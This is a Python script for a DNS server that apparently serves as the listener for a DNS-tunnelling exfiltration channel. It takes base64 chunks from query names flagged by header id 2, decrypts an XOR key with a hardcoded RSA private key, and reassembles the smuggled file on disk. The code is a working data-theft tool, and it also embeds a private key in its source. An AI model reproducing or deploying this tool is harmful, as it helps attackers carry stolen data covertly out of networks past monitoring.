#!/usr/bin/env python
# coding=utf-8

import argparse
import datetime
import sys
import time
import threading
import traceback
import socketserver
import struct
import re
import random
import string
from itertools import cycle
from Crypto.PublicKey import RSA
from Crypto.Cipher import PKCS1_v1_5
from Crypto.Cipher import PKCS1_OAEP

try:
    from dnslib import *
except ImportError:
    print("Missing dependency dnslib: <https://pypi.python.org/pypi/dnslib>. Please install it with `pip`.")
    sys.exit(2)


class DomainName(str):
    def __getattr__(self, item):
        return DomainName(item + '.' + self)


D = DomainName('example.com.')
IP = '127.0.0.1'
TTL = 60 * 5

soa_record = SOA(
    mname=D.ns1,  # primary name server
    rname=D.andrei,  # email of the domain administrator
    times=(
        201307231,  # serial number
        60 * 60 * 1,  # refresh
        60 * 60 * 3,  # retry
        60 * 60 * 24,  # expire
        60 * 60 * 1,  # minimum
    )
)
ns_records = [NS(D.ns1), NS(D.ns2)]
records = {
    D: [A(IP), AAAA((0,) * 16), MX(D.mail), soa_record] + ns_records,
    D.ns1: [A(IP)],  # MX and NS records must never point to a CNAME alias (RFC 2181 section 10.3)
    D.ns2: [A(IP)],
    D.mail: [A(IP)],
    D.andrei: [CNAME(D)],
}

file_name = "output.txt"
total_bytes = 0
old_percent = 0
current_byte = 0
xor_key = ""
found_xorkey = False
enc_xorkey = ""
private_key = b'''-----BEGIN RSA PRIVATE KEY-----
MIIEogIBAAKCAQEA1POCyvc01aGQEdruBOO/BA6Axa8HOAjhx3ZRXVrPRYbIuYc+
2IrYeH1HpjOMg7P0Q0dUiVJXbwrnMCUwSRPcX4Dpo00z6OdVrtlBQ4VtHr/XTXsE
hU1d3iK8VueR6/LcTPahKQdeXjTCbcTY7m8hJsAyo1iMjFO3cixU+vqchyVcs6oj
pTWEgCihTxel2zEQl5h9j4oWWSKldA9oywRtTxDrD4a/RAzefjPwWSRHb19UFkwV
5RYu11Fc2RB0ICw2Ezf3EPXxhtjhS+NIt2Hn+fP1sAZRACeoZqMls5smXyq3AKCY
ZdS/orwVHcE9h+5Dj1GQP/BkmaccfaPY/a1OGQIDAQABAoIBAA4IY0dktZfuUZlw
8oZioPpvdOTnUnPK12CsLKhuN4JpY14hH28S7I45aI33OlHjezvZE3pecWHhN2Lg
0Hxq+/ap1BDtdszo5v3iqyj76I5CLg9DsASTberEIeJy2BbS+4QcLHqRAGhM1Gh6
CaGMs9k4iR231BXbM8Io/GCdldBXSIJ/dkg4rWlpk8/neJyxsqZ3BXVSfM8g8L/N
gyqgUjSsOytgrzkU4YPobUBYwelPHom1h+Mzs3JLvlhes8kNF2p/SneCe1WUEOUn
jyDtkWhSiRChbY8cjdrOMixHET9AM936h9pEVcQOHW1XMl4VwKhbxZB2Njs21fh3
BmXUBpECgYEA5zkyGx+EdOaVytCoouEvK5rD+fuyIR6l3uRicdwOgVCu46PKkeSf
jEWIOrR/dwfpQchBFPY9E4p+RC/TzUGgmwqCiLNIorP2xyCg6rccq72dSC1x7k1t
wvDX2tT6Lfig9YbG2kyYOVvkqaNnUDAv5Ze+JPyXJopJQL4u1P80mAcCgYEA68UU
y8MBvVtaQQbQgyoVN+Mzwf8FRxgAsfe2ReIHay8VSy2zK8QxViBe0S5dY5srT9NL
e2WBsW454pfdo/WmsADNeuzBnB49o2IpsOG4kcypvf/IvHOwCdrhDHErHX1LNgFB
pXiLKgSJZtjXnOLrklKFjXjep6XKEYjIn/ZEIN8CgYA1aK68OSF9Zy2+dUgep2kf
51XRTmQs5klmHNboee4XzK05A8JsxKRd4EnBVaQDuJ4Whc0SrHYbJ2hXE70WskwI
w/q23MKwYmVkRZMl5DoJKXlFDMo+Q0BRQRR7BarsJ3v2erVAA2U+Co3c6VOZ4CeQ
Huba4EWBr3uQKt3icTiSzQKBgEtWyNRr1gx6Opb45HxlYC5hrdJZ+YfERcSY0Wf3
WEOJ4hYJ3m0n3lQVN/dEB5eip+50KHSf9ReLj3e2655PCxrGxuJ28U8/4pZo8cWR
+3arnboXGEAP/7rGdI+TQiHEPdpeAGot4NpmZLm2pP9/C6PQNtkEPLH5ql58BRAI
k7ClAoGAFlxmHKcl+3LvppZ7cCeJHCa78GOaAvakUmxTm1sQ6H2BdBeWGLNgrCNF
QrO66jZz58zr8HIGLpMbk9q/BQQt1uh4+1CWkmFizcXLAXAaEmAfJxRvVF+AjH1K
AXVdbksClrtByKUcx1x4/CZ8NzCLoVLeBmO10STfLXGdEt9LQtY=
-----END RSA PRIVATE KEY-----'''

unpad = lambda s : s[0:-ord(s[-1])]

#https://stackoverflow.com/questions/17253086/xoring-file-with-multi-byte-key
def xorEncDec(data, key): 
    l = len(key)
    return bytearray((
        (data[i] ^ ord(key[i % l])) for i in range(0,len(data))
    ))

def RSADecrypt(data):
    encrypted = base64.b64decode(data)
    keyPriv = RSA.importKey(private_key)
    #decipher = Cipher_PKCS1_v1_5.new(keyPriv)
    #decrypted = decipher.decrypt(data, None)
    cipher = PKCS1_OAEP.new(keyPriv)
    #cipher = PKCS1_v1_5.new(keyPriv)
    decrypted = cipher.decrypt(encrypted)
    print(f"decoded: {decrypted}")

def decrypt(data):
    ciphertext = base64.b64decode(data)
    key = RSA.importKey(private_key)
    cipher = PKCS1_OAEP.new(key)
    return cipher.decrypt(ciphertext)

def write_file(b64_data):
    global file_name,total_bytes, old_percent, current_byte, xor_key, found_xorkey, enc_xorkey
    
    plain = base64.b64decode(b64_data)
    if xor_key:
        plain = xorEncDec(plain, xor_key)

    if b"XEnc:" in plain:
        enc_xorkey += plain.decode('utf-8').split(":::")[1]
        if len(enc_xorkey) == 344:
            found_xorkey = True
            #RSADecrypt(enc_xorkey)
            xor_key = decrypt(enc_xorkey).decode('utf-8')
        return
    
    #if b"XOR Key:::" in plain:
    #    xor_key = plain.decode('utf-8').split(":::")[1]
    #    print(f"XOR Key is {xor_key}")
    #    return

    if b"File Name:::" in plain:
        file_name = ''.join(random.choice(string.ascii_lowercase) for i in range(10)) + "_" + plain.decode('utf-8').split(":::")[1]
        print(f"File output name is {file_name}")
        return
    
    if b"File Size:::" in plain:
        total_bytes = int(plain.decode('utf-8').split(":::")[1])
        print(f"File size is {total_bytes}")        
        return

    f = open(file_name,"ab")
    f.write(plain)
     
    #file_size = os.path.getsize(file_name)
    current_byte += len(plain)
    #print(current_byte)
    #print(plain)
    try:
        percentage = (current_byte/total_bytes)*100
        if str(percentage)[0] != str(old_percent)[0]:
            print(f"Progress is current: {format(percentage,'.2f')} percent")
        old_percent = percentage

        if not percentage % 100:
            current_byte = 0
            xor_key = ""
            enc_xorkey = ""
    except:
        pass

def dns_response(data):
    request = DNSRecord.parse(data)

    reply = DNSRecord(DNSHeader(id=request.header.id, qr=1, aa=1, ra=1), q=request.q)

    qname = request.q.qname
    qn = str(qname)
    qtype = request.q.qtype
    qt = QTYPE[qtype]

    if request.header.id == 2:
        line = qn.split(".")[0]
        write_file(line)

    if qn == D or qn.endswith('.' + D):

        for name, rrs in records.items():
            if name == qn:
                for rdata in rrs:
                    rqt = rdata.__class__.__name__
                    if qt in ['*', rqt]:
                        reply.add_answer(RR(rname=qname, rtype=getattr(QTYPE, rqt), rclass=1, ttl=TTL, rdata=rdata))

        for rdata in ns_records:
            reply.add_ar(RR(rname=D, rtype=QTYPE.NS, rclass=1, ttl=TTL, rdata=rdata))

        reply.add_auth(RR(rname=D, rtype=QTYPE.SOA, rclass=1, ttl=TTL, rdata=soa_record))

    return reply.pack()


class BaseRequestHandler(socketserver.BaseRequestHandler):

    def get_data(self):
        raise NotImplementedError

    def send_data(self, data):
        raise NotImplementedError

    def handle(self):
        #now = datetime.datetime.utcnow().strftime('%Y-%m-%d %H:%M:%S.%f')
        #print("\n\n%s request %s (%s %s):" % (self.__class__.__name__[:3], now, self.client_address[0],self.client_address[1]))
        try:
            data = self.get_data()
            #print(len(data), data)  # repr(data).replace('\\x', '')[1:-1]
            self.send_data(dns_response(data))
        except Exception:
            traceback.print_exc(file=sys.stderr)


class TCPRequestHandler(BaseRequestHandler):

    def get_data(self):
        data = self.request.recv(8192).strip()
        sz = struct.unpack('>H', data[:2])[0]
        if sz < len(data) - 2:
            raise Exception("Wrong size of TCP packet")
        elif sz > len(data) - 2:
            raise Exception("Too big TCP packet")
        return data[2:]

    def send_data(self, data):
        sz = struct.pack('>H', len(data))
        return self.request.sendall(sz + data)


class UDPRequestHandler(BaseRequestHandler):

    def get_data(self):
        return self.request[0].strip()

    def send_data(self, data):
        return self.request[1].sendto(data, self.client_address)


def main():
    parser = argparse.ArgumentParser(description='Start a DNS implemented in Python.')
    parser = argparse.ArgumentParser(description='Start a DNS implemented in Python. Usually DNSs use UDP on port 53.')
    parser.add_argument('--host', default='127.0.0.1', help='The host to listen on.')
    parser.add_argument('--port', default=5053, type=int, help='The port to listen on.')
    parser.add_argument('--tcp', action='store_true', help='Listen to TCP connections.')
    parser.add_argument('--udp', action='store_true', help='Listen to UDP datagrams.')
    
    args = parser.parse_args()
    if not (args.udp or args.tcp): parser.error("Please select at least one of --udp or --tcp.")

    print("Starting nameserver...")

    servers = []
    IP = args.host
    if args.udp: servers.append(socketserver.ThreadingUDPServer((IP, args.port), UDPRequestHandler))
    if args.tcp: servers.append(socketserver.ThreadingTCPServer((IP, args.port), TCPRequestHandler))

    for s in servers:
        thread = threading.Thread(target=s.serve_forever)  # that thread will start one more thread for each request
        thread.daemon = True  # exit the server thread when the main thread terminates
        thread.start()
        print("%s server loop running in thread: %s" % (s.RequestHandlerClass.__name__[:3], thread.name))

    try:
        while 1:
            time.sleep(1)
            sys.stderr.flush()
            sys.stdout.flush()

    except KeyboardInterrupt:
        pass
    finally:
        for s in servers:
            s.shutdown()

if __name__ == '__main__':
    main()